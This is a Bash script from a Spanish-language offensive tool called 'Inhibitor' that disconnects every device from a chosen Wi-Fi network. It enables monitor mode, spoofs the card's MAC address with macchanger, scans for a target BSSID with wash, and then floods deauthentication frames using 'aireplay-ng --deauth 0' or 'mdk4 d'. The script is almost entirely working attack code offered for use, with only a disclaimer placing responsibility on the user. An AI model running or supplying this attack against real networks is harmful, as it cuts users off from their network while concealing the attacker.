#!bin/bash

clear
echo
echo "                           _____           _       _   _       _   _                  "
echo "                          |_   _|         | |     (_) | |     (_) | |                 "
echo "                            | |    _ __   | |__    _  | |__    _  | |_    ___    _ __ "
echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  / _ \  | '__|"
echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
echo "                              __________________________________________________"					
echo "                                ︻デ═一  Created by: XDeadHackerX v1.1  ︻デ═一 " 
echo "          -------------------------------------------------------------------------------------------"
echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
echo "          -------------------------------------------------------------------------------------------"
echo
echo
echo "[7] Desconectar a todos los dispositivos de una Red Wifi"
echo 
sudo airmon-ng
echo
read -p "[*] Escribe la Interfaz de la Tarjeta de Red (Ej: wlan0): " interfaz
read -p "[*] Cortar la salida a internet para evitar futuros errores? (y/n): " opc1
echo
if [ $opc1 = y ]
	then
		sudo airmon-ng check kill
	else
		echo "OK"
fi
echo
echo "======================="
echo "Activando Modo Monitor"
echo "======================="
echo "--->""                  |"
sleep 1
echo "-------->""             |"
sleep 1
echo "--------------->""      |"
sleep 1
echo "--------------------->""|"
echo "======================="
sudo airmon-ng stop $interfaz
sudo ifconfig $interfaz promisc
sudo airmon-ng start $interfaz
echo
read -p "[*] Escribe la Interfaz de la Tarjeta de Red en modo Monitor (Ej: wlan0mon o wlan0): " interfaz2
echo
echo "======================="
echo " Activando Modo Seguro"
echo "======================="
echo "--->""                  |"
sleep 1
echo "-------->""             |"
sleep 1
echo "--------------->""      |"
sleep 1
echo "--------------------->""|"
echo "======================="
echo
sudo ifconfig $interfaz2 promisc
sudo ifconfig $interfaz2 down
sudo macchanger -a $interfaz2
sudo ifconfig $interfaz2 up
sleep 2
clear
echo
echo "                           _____           _       _   _       _   _                  "
echo "                          |_   _|         | |     (_) | |     (_) | |                 "
echo "                            | |    _ __   | |__    _  | |__    _  | |_    ___    _ __ "
echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  / _ \  | '__|"
echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
echo "                              __________________________________________________"					
echo "                                ︻デ═一  Created by: XDeadHackerX v1.1  ︻デ═一 " 
echo "          -------------------------------------------------------------------------------------------"
echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
echo "          -------------------------------------------------------------------------------------------"
echo
echo
echo "[#] Pulse Ctrl + c (Cuando aparezca por pantalla el Wifi objetivo, puede tardar hasta 1 minuto)"
echo
sudo wash -2 -5 -a -i $interfaz2
read -p "[*] Copia el BSSID del Wifi Objetivo y pegelo a continuacion: " bssid
read -p "[*] Copia el Canal (Ch) del Wifi Objetivo y pegelo a continuacion: " ch
echo
echo "================="
echo "[1] Wifi 2,4GHz"
echo "[2] Wifi 5GHz"
echo "================="
echo
read -p "Que banda Wifi utiliza su Objetivo: " opc2
	case $opc2 in
			1 )	clear
				echo
				echo "                           _____           _       _   _       _   _                  "
				echo "                          |_   _|         | |     (_) | |     (_) | |                 "
				echo "                            | |    _ __   | |__    _  | |__    _  | |_    ___    _ __ "
				echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  / _ \  | '__|"
				echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
				echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
				echo "                              __________________________________________________"					
				echo "                                ︻デ═一  Created by: XDeadHackerX v1.1  ︻デ═一 " 
				echo "          -------------------------------------------------------------------------------------------"
				echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
				echo "          -------------------------------------------------------------------------------------------"
				echo
				echo
				echo "[#] Pulse Ctrl + c (Para finalizar el Ataque y Todos los usuarios se reconecten al Wifi)"
				echo
				echo
				echo "========================================================================================="
				echo "                      El Objetivo ($bssid) esta siendo Atacado"
				echo "========================================================================================="
				echo
				sudo aireplay-ng --deauth 0 -a $bssid $interfaz2
				echo
				echo
				;;
			2 )	clear
				echo
				echo "                           _____           _       _   _       _   _                  "
				echo "                          |_   _|         | |     (_) | |     (_) | |                 "
				echo "                            | |    _ __   | |__    _  | |__    _  | |_    ___    _ __ "
				echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  / _ \  | '__|"
				echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
				echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
				echo "                              __________________________________________________"					
				echo "                                ︻デ═一  Created by: XDeadHackerX v1.1  ︻デ═一 " 
				echo "          -------------------------------------------------------------------------------------------"
				echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
				echo "          -------------------------------------------------------------------------------------------"
				echo
				echo
				echo "[#] Pulse Ctrl + c (Para finalizar el Ataque y Todos los usuarios se reconecten al Wifi)"
				echo
				echo
				echo "========================================================================================="
				echo "                      El Objetivo ($bssid) esta siendo Atacado"
				echo "========================================================================================="
				echo
				sudo mdk4 $interfaz2 d -B $bssid -c $ch
				echo
				echo
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac

sleep 1
echo
echo "=============================="
echo "        Desactivando"
echo "Ataque/Modo Monitor/Seguridad"
echo "=============================="
echo "-------->""                    |"
sleep 1
echo "--------------->""             |"
sleep 1
echo "---------------------->""      |"
sleep 1
echo "---------------------------->""|"
echo "=============================="
echo
sudo ifconfig $interfaz2 down
sudo macchanger -p $interfaz2
sudo ifconfig $interfaz2 up
sleep 2
sudo ifconfig $interfaz2 -promisc
sudo airmon-ng stop $interfaz2
sudo ifconfig $interfaz -promisc
sudo systemctl restart NetworkManager.service
sleep 1
echo
echo
echo "#####################"
echo "[1] Volver al Menu"
echo "[2] Volver a ejecutar"
echo "[3] Salir"
echo "#####################"
echo
read -p "Elige una opcion: " opc3
	case $opc3 in
			1 )	bash inhibitor.sh
				;;
			2 )	bash requisitos/7.sh
				;;
			3 )	exit && clear
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac
